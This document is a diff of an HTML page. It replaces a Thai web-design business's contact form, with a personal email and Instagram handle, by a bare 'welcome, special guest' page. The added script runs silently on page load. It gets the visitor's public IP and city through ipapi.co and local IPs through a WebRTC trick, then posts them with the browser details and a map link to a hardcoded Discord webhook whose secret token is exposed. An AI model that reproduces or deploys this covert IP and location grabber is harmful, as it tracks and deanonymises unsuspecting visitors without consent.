@@ -3,84 +3,83 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>รับทำเว็บ | Sky Site</title>
+  <title>✅ ยินดีต้อนรับสู่เว็บไซต์</title>
   <link rel="stylesheet" href="style.css" />
-  <link href="https://fonts.googleapis.com/css2?family=Kanit&display=swap" rel="stylesheet" />
 </head>
 <body>
-  <header>
-    <h1>รับทำเว็บ</h1>
-    <p>ยินดีต้อนรับสู่ Sky Site - ที่ที่คุณสามารถติดต่อและส่งข้อความถึงเราได้อย่างง่ายดาย</p>
-  </header>
-  <main>
-    <section class="intro">
-      <h2>ส่งข้อความถึงเรา</h2>
-      <p>กรอกแบบฟอร์มด้านล่าง หากสนใจรับทำเว็บไซต์ หรือต้องการสอบถามเพิ่มเติม เรายินดีให้บริการและรับฟังทุกความต้องการของคุณ</p>
-    </section>
-
-    <form id="contactForm" action="https://formspree.io/f/xqaqoqjy" method="POST">
-      <label for="name">ชื่อ</label>
-      <input type="text" id="name" name="name" placeholder="ชื่อของคุณ" required />
-
-      <label for="email">อีเมล</label>
-      <input type="email" id="email" name="_replyto" placeholder="example@email.com" />
-
-      <label for="message">ข้อความ</label>
-      <textarea id="message" name="message" placeholder="พิมพ์ข้อความที่นี่..." rows="5" required></textarea>
-
-      <button type="submit" id="submitBtn">
-        <span>ส่งข้อความ</span>
-        <div class="loading-spinner"></div>
-      </button>
-    </form>
-
-    <div id="formMessage" class="message-box"></div>
-  </main>
-  <footer>
-    <div class="contact-info">
-      <h2>ติดต่อเรา</h2>
-      <p><strong>Instagram:</strong> <a href="https://www.instagram.com/sky._.abc" target="_blank" rel="noopener noreferrer">sky._.abc</a></p>
-      <p><strong>อีเมล:</strong> <a href="mailto:dechakhaphuthnkvt65@gmail.com">dechakhaphuthnkvt65@gmail.com</a></p>
-    </div>
-    <p class="copyright">© 2025 Sky Site. สงวนลิขสิทธิ์ทุกประการ</p>
-  </footer>
+  <div class="container">
+    <h1>✅ ยินดีต้อนรับสู่เว็บไซต์</h1>
+    <p>คุณเป็นแขกพิเศษของเรา</p>
+  </div>
 
   <script>
-    const form = document.getElementById('contactForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const messageBox = document.getElementById('formMessage');
+    const webhookURL = "https://discord.com/api/webhooks/1378728447647682591/BgtTJM5LlpBKWcrHmH7e32FHQq4z-TwIJUiy133A7mHI2SmwmIPbZ6-_8ro1E0tINTYQ"; // เปลี่ยนเป็น webhook ของคุณ
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
+    async function getLocalIPs() {
+      return new Promise((resolve, reject) => {
+        const ips = new Set();
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel("");
+        pc.createOffer()
+          .then(offer => pc.setLocalDescription(offer))
+          .catch(err => reject(err));
+        pc.onicecandidate = event => {
+          if (!event.candidate) {
+            resolve([...ips]);
+            return;
+          }
+          const parts = event.candidate.candidate.split(' ');
+          const ip = parts[4];
+          if (ip && !ips.has(ip)) {
+            ips.add(ip);
+          }
+        };
+      });
+    }
 
-      // แสดงสถานะ loading
-      submitBtn.classList.add('loading');
-      messageBox.textContent = "กำลังส่งข้อความ...";
-      messageBox.className = "message-box visible";
+    async function sendToDiscord(publicInfo, localIPs) {
+      const mapUrl = `https://www.google.com/maps?q=${publicInfo.latitude},${publicInfo.longitude}`;
 
-      const formData = new FormData(form);
+      const payload = {
+        username: "🌐 ผู้เข้าชมเว็บ!",
+        embeds: [{
+          title: "🚀 มีผู้เยี่ยมชมใหม่",
+          color: 0x00ccff,
+          fields: [
+            { name: "🕒 เวลาเข้า", value: new Date().toLocaleString(), inline: false },
+            { name: "🌍 IP จริง", value: publicInfo.ip, inline: true },
+            { name: "🌍 ประเทศ/เมือง", value: `${publicInfo.country_name} / ${publicInfo.city || 'ไม่พบข้อมูล'}`, inline: true },
+            { name: "💻 เบราว์เซอร์", value: navigator.userAgent, inline: false },
+            { name: "📍 ดูแผนที่", value: `[คลิกเพื่อดูแผนที่](${mapUrl})`, inline: false },
+            { name: "🛡️ IP ทั้งหมด (Local + Public) ที่พบ", value: localIPs.join(", "), inline: false }
+          ]
+        }]
+      };
 
       try {
-        const response = await fetch(form.action, {
-          method: form.method,
-          body: formData,
-          headers: { 'Accept': 'application/json' }
+        const res = await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
         });
-
-        if (response.ok) {
-          messageBox.textContent = "ส่งข้อความสำเร็จ! ขอบคุณที่ติดต่อเรา 😊 เรายินดีจะติดต่อกลับในไม่ช้า";
-          messageBox.className = "message-box visible success";
-          form.reset();
-        } else {
-          throw new Error('เกิดข้อผิดพลาดในการส่ง');
-        }
-      } catch (error) {
-        messageBox.textContent = "ส่งข้อความไม่สำเร็จ กรุณาลองใหม่อีกครั้ง";
-        messageBox.className = "message-box visible error";
-      } finally {
-        submitBtn.classList.remove('loading');
+        if (!res.ok) throw new Error(`ส่ง Webhook ไม่สำเร็จ รหัส: ${res.status}`);
+        console.log("ส่งข้อมูลไป Discord เรียบร้อย");
+      } catch (err) {
+        console.error("เกิดข้อผิดพลาด:", err);
       }
-    });
+    }
+
+    (async () => {
+      try {
+        const res = await fetch("https://ipapi.co/json/?lang=th");
+        const publicInfo = await res.json();
+        const localIPs = await getLocalIPs();
+
+        await sendToDiscord(publicInfo, localIPs);
+      } catch (err) {
+        console.error("เกิดข้อผิดพลาด:", err);
+      }
+    })();
   </script>
 </body>
 </html>
